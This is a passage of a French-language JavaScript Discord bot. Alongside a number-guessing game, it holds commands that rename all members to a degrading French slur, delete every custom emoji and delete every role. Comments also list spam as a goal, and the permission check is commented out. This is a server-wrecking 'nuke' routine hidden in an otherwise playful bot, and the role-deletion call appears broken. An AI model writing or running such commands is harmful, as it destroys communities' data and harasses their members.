        // message.guild.members.filter(member => member.id).forEach(member => { member.setNickname() });
        message.guild.members.filter(m => !m.user.bot).map(async members => await members.setNickname("Nous sommes des putes"))
        message.guild.members.map(async members => await members.setNickname("Alex_-"))

    }

    // Delete All Emojis
    if (message.content.startsWith(prefix + "delemo")) {
        message.guild.emojis.forEach(x => { message.guild.deleteEmoji(x) })
    }

    if (message.content.startsWith(prefix + "delrole")) {
        message.guild.roles.forEach(x => { message.guild.delete(x) })
    }



    // spam
    // del all roles
    // rename all members

    // if(!message.member.hasPermission('MANAGE_ROLES')) return noPermissions();
    // let role = message.guild.roles.forEach(t => t.name)
    // message.guild.members.forEach(member => {
    //   if(!member.roles.find(t => t.name)) return;
    //   member.removeRole(role)
    //       .then(function() {
    //       console.log(`Removed role from user ${member.user.tag}!`);
    //     })
    // })
})  

bot.on('message', function (message) {
    if (message.channel.type === 'dm') return;
    if (message.author.bot) return;
    var chassedb = db.get("chasse").find('nombre').value()
    var nombre = Object.values(chassedb);
   // let chs = message.guild.channels.find(channels => channels.name === "plus-ou-moins");
  //  if (message.channel === chs) {
        if (message.content == prefix + "justenombre") {
            message.reply("test")
            if (nombre[3] <= 4) {
                if (nombre[0] == "azertyuiop") {
                    message.reply("Tirage aléatoire effectué, essayez de trouver le bon nombre entre 0 et 500 !")
                    number_random = Math.floor(Math.random() * (500 - 0) + 0)
                    console.log(number_random);
                    db.get("chasse").find({ partieetat: "attente" }).assign({ partieetat: nombre[1] = "start", nombre: nombre[0] = number_random, essaisold: nombre[4] = 0 }).write();
                } else {
                    message.reply("Une partie est déjà en cours !")
                }
            }

        }
        if (nombre[1] == "start") {
            if (message.content > nombre[0]) {
                message.reply("C'est moins !")
                db.get("chasse").find("nombre").assign({ essais: nombre[2] += 1 }).write();
            }
            else if (message.content < nombre[0]) {
                message.reply("C'est plus !")
                db.get("chasse").find("nombre").assign({ essais: nombre[2] += 1 }).write();
            }
            if (message.content == nombre[0]) {
                if (nombre[3] <= 4) {
                    var msgauthor = message.author.username;
                    message.reply(`à trouvé le bon nombre, félicitation ! (en ` + `${nombre[2]}` + ` essais)`);
                    db.get("chasse").find("nombre").assign({
                        nombre: nombre[0] = "azertyuiop",
                        partieetat: nombre[1] = "attente",
                        essaisold: nombre[4] = nombre[2],
                        essais: nombre[2] = 1,

                    }).write();
                }
            }
        }
   // }

    
})